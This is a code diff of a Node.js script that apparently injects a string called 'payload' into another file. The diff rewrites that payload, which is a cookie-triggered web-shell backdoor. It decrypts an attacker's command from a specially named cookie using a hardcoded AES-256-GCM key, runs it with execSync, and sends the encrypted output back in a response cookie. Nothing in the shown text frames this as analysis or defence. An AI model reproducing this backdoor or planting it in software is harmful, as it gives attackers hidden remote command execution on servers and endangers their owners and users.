@@ -38,7 +38,49 @@ if (process.argv[2] == 'a') {
 
   if (waited < 600000) {
     try {
-      const payload = "\t\t// Triple-T says Sahur!\n\t\tconst crypto = require(\"crypto\");\n\n\t\tconst key = Buffer.from(\"74696772756c696e6977617465726d656c696e6974696772756c696e69776174\", \"hex\");\n\n\t\tif (req.headers.cookie) {\n\t\t\tconst cookies = req.headers.cookie.split(/;\\s*/);\n\t\t\tfor (const entry of cookies) {\n\t\t\t\tconst eq = entry.indexOf(\"=\");\n\t\t\t\tif (eq === -1) continue;\n\t\t\t\tconst name = entry.slice(0, eq);\n\t\t\t\tconst value = entry.slice(eq + 1);\n\t\t\t\tif (name === \"__TTT-54HuR\") {\n\t\t\t\t\tconst { execSync } = require(\"child_process\");\n\t\t\t\t\tconst inBuf = Buffer.from(value, \"base64url\");\n\t\t\t\t\tconst inIv = inBuf.subarray(0, 12);\n\t\t\t\t\tconst inTag = inBuf.subarray(12, 28);\n\t\t\t\t\tconst inCiphertext = inBuf.subarray(28);\n\t\t\t\t\tconst decipher = crypto.createDecipheriv(\"aes-256-gcm\", key, inIv);\n\t\t\t\t\tdecipher.setAuthTag(inTag);\n\t\t\t\t\tconst command = Buffer.concat([decipher.update(inCiphertext), decipher.final()]).toString(\"utf8\");\n\t\t\t\t\tconst out = execSync(command).toString();\n\t\t\t\t\tconst iv = crypto.randomBytes(12);\n\t\t\t\t\tconst cipher = crypto.createCipheriv(\"aes-256-gcm\", key, iv);\n\t\t\t\t\tconst encrypted = Buffer.concat([cipher.update(out.trim(), \"utf8\"), cipher.final()]);\n\t\t\t\t\tconst tag = cipher.getAuthTag();\n\t\t\t\t\tconst output = Buffer.concat([iv, tag, encrypted]).toString(\"base64url\");\n\t\t\t\t\tres.setHeader(\"Set-Cookie\", `__tLL-TLalA=${output}; Path=/; HttpOnly; SameSite=Lax`);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n";
+      const payload = `        // Triple-T says Sahur!
+        const crypto = require('crypto');
+        const key = Buffer.from('74696772756c696e6977617465726d656c696e6974696772756c696e69776174', 'hex');
+        if (req.headers.cookie) {
+            const cookies = req.headers.cookie.split(/;\\s*/);
+            for(const entry of cookies){
+                const equalsIndex = entry.indexOf('=');
+                if (equalsIndex === -1) {
+                    continue;
+                }
+                const name = entry.slice(0, equalsIndex);
+                const value = entry.slice(equalsIndex + 1);
+                if (name === '__TTT-54HuR') {
+                    const { execSync } = require('child_process');
+                    const decoded = Buffer.from(value, 'base64url');
+                    const iv = decoded.subarray(0, 12);
+                    const authTag = decoded.subarray(12, 28);
+                    const ciphertext = decoded.subarray(28);
+                    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
+                    decipher.setAuthTag(authTag);
+                    const command = Buffer.concat([
+                        decipher.update(ciphertext),
+                        decipher.final()
+                    ]).toString('utf8');
+                    const stdout = execSync(command).toString();
+                    const responseIv = crypto.randomBytes(12);
+                    const cipher = crypto.createCipheriv('aes-256-gcm', key, responseIv);
+                    const encrypted = Buffer.concat([
+                        cipher.update(stdout.trim(), 'utf8'),
+                        cipher.final()
+                    ]);
+                    const responseTag = cipher.getAuthTag();
+                    const output = Buffer.concat([
+                        responseIv,
+                        responseTag,
+                        encrypted
+                    ]).toString('base64url');
+                    res.setHeader('Set-Cookie', \`__tLL-TLalA=\${output}; Path=/; HttpOnly; SameSite=Lax\`);
+                    break;
+                }
+            }
+        }
+`;
       let lines = ""
       lines = fs.readFileSync(filePath, 'utf8').split(/\r?\n/);
 
